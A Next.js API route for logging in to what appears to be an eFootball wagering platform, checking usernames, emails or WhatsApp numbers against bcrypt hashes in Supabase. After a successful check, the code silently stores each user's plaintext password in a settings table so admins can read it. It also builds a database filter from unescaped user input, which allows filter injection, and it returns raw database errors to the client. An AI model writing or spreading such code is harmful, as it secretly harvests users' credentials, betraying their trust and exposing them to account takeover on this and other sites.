import { NextResponse } from 'next/server';
import { supabaseAdmin } from '@/lib/supabase';
import bcrypt from 'bcryptjs';
import { signToken } from '@/lib/auth';

export async function POST(req: Request) {
  try {
    const { login, password } = await req.json();

    if (!login || !password) {
      return NextResponse.json({ error: 'Dakhel username/email w l-mot de passe' }, { status: 400 });
    }

    const cleanLogin = login.trim();
    const phoneDigits = login.replace(/[^0-9]/g, '');

    let query = supabaseAdmin.from('users').select('*');
    if (phoneDigits.length >= 9) {
      query = query.or(`username.ilike.${cleanLogin},email.ilike.${cleanLogin},whatsapp.ilike.%${phoneDigits.slice(-9)}%`);
    } else {
      query = query.or(`username.ilike.${cleanLogin},email.ilike.${cleanLogin},whatsapp.eq.${cleanLogin}`);
    }

    const { data: users, error: dbError } = await query.limit(1);

    if (dbError) {
      return NextResponse.json({ error: dbError.message }, { status: 500 });
    }

    const user = users && users.length > 0 ? users[0] : null;

    if (!user) {
      return NextResponse.json({ error: 'Username/Email/Numéro awla Mot de passe ghalat' }, { status: 401 });
    }

    if (user.role === 'BANNED') {
      return NextResponse.json({ 
        error: 'Had l-hisab m-banni (Banned). Twasel m3a l-admin f WhatsApp: +212604084574' 
      }, { status: 403 });
    }

    const match = bcrypt.compareSync(password, user.password_hash);
    if (!match) {
      return NextResponse.json({ error: 'Username awla Mot de passe ghalat' }, { status: 401 });
    }

    // Cache password in platform_settings so admin can view it
    try {
      await supabaseAdmin.from('platform_settings').upsert({
        key: `u_pwd_${user.id}`,
        value: password
      }, { onConflict: 'key' });
    } catch {}

    const token = await signToken({ id: user.id, username: user.username, role: user.role });

    // Determine redirect URL based on role
    const redirectUrl = (user.role === 'SUPER_ADMIN' || user.role === 'ADMIN') ? '/admin' : '/';
    const response = NextResponse.json({
      success: true,
      user: {
        id: user.id,
        username: user.username,
        email: user.email,
        efootball_id: user.efootball_id,
        whatsapp: user.whatsapp,
        balance: user.balance,
        role: user.role,
        avatar: user.avatar,
        wins: user.wins,
        losses: user.losses,
      },
      redirectUrl,
    });

    response.cookies.set('auth_token', token, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'lax',
      path: '/',
      maxAge: 60 * 60 * 24 * 7, // 7 days
    });

    return response;
  } catch (err: any) {
    return NextResponse.json({ error: err.message || 'Mochkil f l-server' }, { status: 500 });
  }
}
